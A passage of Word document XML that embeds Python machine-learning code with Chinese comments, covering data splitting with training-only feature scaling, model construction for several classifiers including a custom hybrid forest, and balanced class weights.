      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            X, y, test_size=test_size, stratify=y, random_state=seed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A29065F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BD3C1D6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        val_frac = val_size / (1.0 - test_size)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63D20C79">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        X_train, X_val, y_train, y_val = train_test_split(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DA2A740">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            X_tmp, y_tmp, test_size=val_frac, stratify=y_tmp, random_state=seed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="275B7FDB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45615E05">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="740BCCFD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        tr, va, te = split_by_time(X, y, order, test_size, val_size)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AA46826">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        X_train, X_val, X_test = X[tr], X[va], X[te]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40CC76F8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        y_train, y_val, y_test = y[tr], y[va], y[te]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F638B77">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    scaler = StandardScaler().fit(X_train)  # 只在训练集上拟合，防止验证/测试信息泄漏</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="166B61B5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # 前向滚动验证模式下没有单独的验证段，StandardScaler 不收 0 行的数组</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3ACCB809">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    X_val = scaler.transform(X_val) if len(X_val) else X_val</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33BDE1EA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return (</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13E50A1E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        scaler.transform(X_train),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E45B6FA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        X_val,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46E9238C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        scaler.transform(X_test),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FF403C3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        y_train,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52679693">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        y_val,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77150720">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        y_test,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="334BC84E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        scaler,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10C64F7F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CD0DB11">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="70AA9A16">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7142965A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># ------------------------------------------------------------------ 模型构建</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18E8BC10">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D650516">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="598709BD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def build_model(name, mcfg, seed):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22776DB7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if name == "decision_tree":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27EAAED6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return DecisionTreeClassifier(random_state=seed, **mcfg["decision_tree"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09402C4A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if name == "random_forest":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21A99BC3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return RandomForestClassifier(random_state=seed, **mcfg["random_forest"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A15FABC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if name == "xgboost":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60CEC5A3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return XGBClassifier(random_state=seed, tree_method="hist", verbosity=0, **mcfg["xgboost"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="606826BA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if name == "logistic":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="734F17ED">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return LogisticRegression(random_state=seed, **mcfg["logistic"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AEF5A2D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if name == "hybrid_forest":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27926E30">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        h = mcfg["hybrid_forest"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70A5655F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return HybridForest(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A0AC7E0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            n_estimators=h["n_estimators"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BC905B2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            max_depth=h["max_depth"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="236A3DD5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            max_features=h["max_features"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14EECF15">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            base_depth=h["base_depth"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32AFC6E0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            base_rounds=h["base_rounds"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24B46FE5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            base_pool=tuple(h["base_pool"]),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="148059C2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            base_overrides=h.get("base_overrides"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D99B2CE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            class_weight=h.get("class_weight", "balanced"),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="608FF7A9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            random_state=seed,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40E1008F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            n_jobs=h.get("n_jobs", -1),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C26715B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B81F227">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    raise SystemExit(f"未知模型：{name}，可选 {mcfg['candidates']}")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40886A74">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D51C2DC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5AFF639F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def balanced_weights(y):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C79B750">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """与 class_weight='balanced' 等价的样本权重，给不支持 class_weight 的 XGBoost 用。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="046E28CA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    classes, counts = np.unique(y, return_counts=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C76F5E3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    per = len(y) / (len(classes) * counts)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53E80FE1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    table = dict(zip(classes, per))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A6E1268">
      <w:pPr>
        <w:widowControl w:val="0"/>
